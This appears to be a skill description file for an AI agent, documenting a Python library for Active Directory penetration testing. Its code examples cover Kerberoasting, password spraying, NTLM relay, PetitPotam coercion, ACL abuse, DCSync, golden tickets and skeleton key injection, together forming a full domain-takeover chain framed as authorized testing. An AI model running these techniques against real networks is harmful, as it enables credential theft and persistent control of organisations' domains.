---
name: active-directory-testing
description: |
  Active Directory security testing and attack techniques. Domain enumeration,
  Kerberos attacks, privilege escalation, and persistence in AD environments.
  Use for authorized AD penetration testing.
license: Apache-2.0
compatibility: |
  - Python 3.9+
  - Optional: impacket, ldap3, bloodhound
metadata:
  author: SherifEldeeb
  version: "1.0.0"
  category: pentesting
---

# Active Directory Testing Skill

Active Directory security testing capabilities for authorized penetration testing.

## Capabilities

- **Domain Enumeration**: Users, groups, computers, GPOs
- **Kerberos Attacks**: Kerberoasting, AS-REP roasting, delegation
- **Credential Attacks**: Password spraying, credential relay
- **Privilege Escalation**: ACL abuse, delegation abuse
- **Lateral Movement**: Pass-the-hash, pass-the-ticket
- **Persistence**: Golden ticket, silver ticket, skeleton key
- **Trust Attacks**: Cross-domain and forest attacks

## Quick Start

```python
from ad_utils import ADEnumerator, KerberosAttacker, ACLAnalyzer

# Enumerate domain
enum = ADEnumerator('dc.domain.local')
enum.authenticate('user', 'password')
users = enum.get_users()
groups = enum.get_groups()

# Kerberoasting
kerberos = KerberosAttacker('domain.local')
spns = kerberos.kerberoast()

# ACL analysis
acl = ACLAnalyzer('domain.local')
paths = acl.find_attack_paths('user@domain.local')
```

## Usage

### Domain Enumeration

Enumerate Active Directory objects.

**Example**:
```python
from ad_utils import ADEnumerator

enum = ADEnumerator('dc.domain.local', 389)

# Authenticate
enum.authenticate('user', 'password')
# Or with hash
enum.authenticate_ntlm('user', 'aad3b435b51404ee:...')

# Get domain info
domain = enum.get_domain_info()
print(f"Domain: {domain['name']}")
print(f"Functional level: {domain['functional_level']}")
print(f"Domain controllers: {domain['dcs']}")

# Enumerate users
users = enum.get_users()
for user in users:
    print(f"{user['samaccountname']} - {user['description']}")

# Find privileged users
admins = enum.get_privileged_users()
print(f"Domain Admins: {admins['domain_admins']}")
print(f"Enterprise Admins: {admins['enterprise_admins']}")

# Enumerate groups
groups = enum.get_groups()

# Enumerate computers
computers = enum.get_computers()
for comp in computers:
    print(f"{comp['name']} - {comp['os']}")

# Find domain controllers
dcs = enum.get_domain_controllers()

# Enumerate GPOs
gpos = enum.get_gpos()

# Enumerate trusts
trusts = enum.get_trusts()

# Export to BloodHound
enum.export_bloodhound('bloodhound_data/')
```

### Kerberos Attacks

Perform Kerberos-based attacks.

**Example**:
```python
from ad_utils import KerberosAttacker

kerberos = KerberosAttacker('domain.local', 'dc.domain.local')

# Kerberoasting - request TGS for SPNs
spns = kerberos.kerberoast()
for spn in spns:
    print(f"SPN: {spn['spn']}")
    print(f"User: {spn['user']}")
    print(f"Hash: {spn['hash']}")

# AS-REP Roasting - users without preauth
asrep = kerberos.asrep_roast()
for user in asrep:
    print(f"User: {user['user']}")
    print(f"Hash: {user['hash']}")

# Enumerate SPNs
spns = kerberos.enumerate_spns()

# Check for unconstrained delegation
unconstrained = kerberos.find_unconstrained_delegation()

# Check for constrained delegation
constrained = kerberos.find_constrained_delegation()

# Check for resource-based constrained delegation
rbcd = kerberos.find_rbcd()

# Request TGT
tgt = kerberos.request_tgt('user', 'password')

# Request service ticket
tgs = kerberos.request_tgs(tgt, 'cifs/dc.domain.local')

# Export tickets
kerberos.export_tickets('tickets/')
```

### ACL Analysis

Analyze Active Directory ACLs for attack paths.

**Example**:
```python
from ad_utils import ACLAnalyzer

acl = ACLAnalyzer('domain.local')
acl.authenticate('user', 'password')

# Find attack paths from user
paths = acl.find_attack_paths('user@domain.local')
for path in paths:
    print(f"Path to {path['target']}:")
    for step in path['steps']:
        print(f"  {step['from']} --{step['right']}--> {step['to']}")

# Find users with DCSync rights
dcsync = acl.find_dcsync_principals()
print(f"DCSync principals: {dcsync}")

# Find users who can modify GPOs
gpo_editors = acl.find_gpo_editors()

# Find writable objects
writable = acl.find_writable_objects('user@domain.local')

# Check specific ACL
rights = acl.check_acl('CN=Admin,CN=Users,DC=domain,DC=local')
print(f"Rights: {rights}")

# Find password reset rights
pwd_reset = acl.find_password_reset_rights()

# Find object control paths
control = acl.find_object_control('targetuser@domain.local')
```

### Credential Attacks

Domain credential attacks.

**Example**:
```python
from ad_utils import CredentialAttacker

creds = CredentialAttacker('domain.local')

# Password spraying
results = creds.password_spray(
    users=['user1', 'user2', 'user3'],
    password='Winter2024!',
    protocol='ldap'
)
for valid in results['valid']:
    print(f"Valid: {valid['user']}:{valid['password']}")

# SMB relay
creds.start_relay_server(
    target='192.168.1.100',
    command='whoami'
)

# NTLM relay to LDAP
creds.relay_to_ldap(
    target='dc.domain.local',
    action='delegate'
)

# Coerce authentication (PetitPotam, PrinterBug)
creds.coerce_auth(
    target='192.168.1.100',
    listener='192.168.1.50',
    method='petitpotam'
)
```

### Privilege Escalation

Domain privilege escalation techniques.

**Example**:
```python
from ad_utils import PrivilegeEscalation

privesc = PrivilegeEscalation('domain.local')
privesc.authenticate('user', 'password')

# Abuse GenericAll/GenericWrite
privesc.abuse_generic_all(
    target='targetuser',
    action='reset_password',
    new_password='NewPassword123!'
)

# Abuse WriteDACL
privesc.abuse_write_dacl(
    target='OU=Users,DC=domain,DC=local',
    grant_to='controlleduser'
)

# Abuse AddMember
privesc.abuse_add_member(
    group='Domain Admins',
    user='controlleduser'
)

# Abuse RBCD
privesc.abuse_rbcd(
    target='dc$',
    controlled_computer='evil$'
)

# Shadow Credentials
privesc.shadow_credentials(target='targetuser')

# DCSync (requires replication rights)
hashes = privesc.dcsync(user='krbtgt')
print(f"KRBTGT hash: {hashes}")
```

### Persistence

Establish domain persistence.

**Example**:
```python
from ad_utils import DomainPersistence

persist = DomainPersistence('domain.local')

# Golden Ticket (requires krbtgt hash)
golden = persist.create_golden_ticket(
    user='Administrator',
    domain='domain.local',
    sid='S-1-5-21-...',
    krbtgt_hash='aad3b435b51404ee:...'
)

# Silver Ticket
silver = persist.create_silver_ticket(
    user='Administrator',
    domain='domain.local',
    service='cifs/dc.domain.local',
    service_hash='aad3b435b51404ee:...'
)

# Skeleton Key (in-memory on DC)
persist.inject_skeleton_key(dc='dc.domain.local')

# AdminSDHolder
persist.abuse_adminsdholder(user='controlleduser')

# DSRM password
persist.set_dsrm_password(dc='dc.domain.local')

# SID History injection
persist.inject_sid_history(
    user='controlleduser',
    sid_to_add='S-1-5-21-...-512'  # Domain Admins
)
```

## Configuration

### Environment Variables

| Variable | Description | Required | Default |
|----------|-------------|----------|---------|
| `AD_DOMAIN` | Target domain | No | Auto-detect |
| `AD_DC` | Domain controller | No | Auto-detect |

## Examples

### Example 1: Full AD Assessment

```python
# 1. Enumerate domain
enum = ADEnumerator('dc.domain.local')
enum.authenticate('user', 'password')
enum.full_enumeration()

# 2. Find attack paths
acl = ACLAnalyzer('domain.local')
paths = acl.find_all_attack_paths()

# 3. Kerberoast
kerberos = KerberosAttacker('domain.local')
spns = kerberos.kerberoast()

# 4. Crack hashes
# Use password-attacks skill

# 5. Privilege escalation
privesc = PrivilegeEscalation('domain.local')
privesc.escalate_to_da()
```

## Limitations

- **Domain Access**: Requires domain credentials
- **Detection**: Activities may trigger security alerts
- **Complexity**: Large domains require careful enumeration

## Related Skills

- [password-attacks](../password-attacks/): Crack Kerberos hashes
- [post-exploitation](../post-exploitation/): Lateral movement
- [pentest-reporting](../pentest-reporting/): Document findings

## References

- [Active Directory Security](https://adsecurity.org/)
- [BloodHound](https://github.com/BloodHoundAD/BloodHound)
- [Impacket](https://github.com/SecureAuthCorp/impacket)
